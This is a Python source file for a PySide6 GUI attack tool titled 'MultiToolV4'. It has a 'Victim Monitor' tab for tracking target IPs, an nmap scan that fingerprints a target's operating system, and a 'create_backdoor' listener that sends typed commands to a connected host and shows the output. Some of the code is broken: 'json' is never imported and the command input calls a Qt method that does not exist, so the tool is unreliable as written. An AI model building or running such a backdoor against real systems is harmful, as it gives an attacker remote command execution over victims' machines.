import socket
import subprocess
import nmap
import threading
import logging
from logging.handlers import RotatingFileHandler
import requests
import openai
import os
import sys
import asyncio
from PySide6.QtWidgets import QApplication, QMainWindow, QTextEdit, QPushButton, QVBoxLayout, QWidget, QTabWidget, QLineEdit
from PySide6 import QtCore

# ===================== Logging Setup ===================== #
if not os.path.exists('logs'):
    os.makedirs('logs')

log_file = os.path.join('logs', 'multi_tool.log')
log_handler = RotatingFileHandler(log_file, maxBytes=1024 * 1024, backupCount=5)
logging.basicConfig(handlers=[log_handler], level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants for Setup
LHOST = "localhost"
RHOST = "target_ip"
PROXY = "proxy_ip:proxy_port"
NMAP_ARGS = "-Pn -sT -O"

# API Credentials from config file
with open('config/api_credentials.json', 'r') as cred_file:
    api_credentials = json.load(cred_file)

# Initialize OpenAI API
openai.api_key = api_credentials["openai_api_key"]

# ===================== Error Handling ===================== #
def handle_exception(exception, output_area=None):
    """Log and handle exceptions."""
    error_message = str(exception)
    logging.error(error_message)
    if output_area:
        output_area.append(f"Error: {error_message}")

# ===================== Victim Monitoring ===================== #
victims = []

def add_victim(ip_address, output_area):
    """Monitor victim."""
    if not validate_ip(ip_address):
        output_area.append(f"Invalid IP address: {ip_address}\n")
        logging.error(f"Attempted to monitor invalid IP address: {ip_address}")
        return

    victims.append(ip_address)
    output_area.append(f"Monitoring victim: {ip_address}\n")

def validate_ip(ip):
    """Validate if the given string is a valid IP address."""
    import re
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    return re.match(ip_pattern, ip) is not None

# ===================== Scanning and Backdoor ===================== #
def scan_target(rhost, output_area):
    """Scan target using Nmap."""
    try:
        nm = nmap.PortScanner()
        nm.scan(rhost, arguments=NMAP_ARGS)
        result = f"Target OS: {nm[rhost]['osclass'][0]['osfamily']}\n{nm.csv()}"
        output_area.append(result)
    except Exception as e:
        handle_exception(e)

def create_backdoor(lhost, port=8080, output_area=None, stop_event=None):
    """Create a backdoor."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.append(f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        output_area.append(f"Connection established with {addr}\n")

        while not stop_event.is_set():
            cmd, ok = QLineEdit.getText(None, "Command Input", "Enter command:")
            if not ok or cmd.lower() in ['exit', 'quit']:
                break
            conn.sendall(cmd.encode())
            response = conn.recv(4096).decode()
            output_area.append(response + '\n')
        conn.close()
    except Exception as e:
        handle_exception(e)

# ===================== GUI Application ===================== #
class MultiToolV4(QMainWindow):
    """Main GUI for MultiToolV4."""
    
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.stop_event = threading.Event()

    def init_ui(self):
        self.setWindowTitle('MultiToolV4 by kdairatchi')

        # Central Widget
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        # Tabs
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)

        # Victim Monitoring Tab
        self.add_victim_monitor_tab()

        # Error Handling Tab
        self.add_error_handling_tab()

        self.show()

    def add_victim_monitor_tab(self):
        """Add victim monitoring tab."""
        victim_tab = QWidget()
        self.victim_output = QTextEdit()
        victim_ip_input = QLineEdit()
        add_victim_button = QPushButton("Add Victim")
        add_victim_button.clicked.connect(lambda: add_victim(victim_ip_input.text(), self.victim_output))
        layout = QVBoxLayout(victim_tab)
        layout.addWidget(victim_ip_input)
        layout.addWidget(self.victim_output)
        layout.addWidget(add_victim_button)
        self.tabs.addTab(victim_tab, "Victim Monitor")

    def add_error_handling_tab(self):
        """Add AI error handling tab."""
        error_handling_tab = QWidget()
        self.error_output = QTextEdit()
        layout = QVBoxLayout(error_handling_tab)
        layout.addWidget(self.error_output)
        self.tabs.addTab(error_handling_tab, "Error Handling")

    def start_backdoor_thread(self):
        self.stop_event.clear()
        threading.Thread(target=create_backdoor, args=(LHOST, 8080, self.error_output, self.stop_event), daemon=True).start()

    def stop_backdoor_thread(self):
        self.stop_event.set()

# Main function to start the GUI application
def main():
    app = QApplication(sys.argv)
    gui = MultiToolV4()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()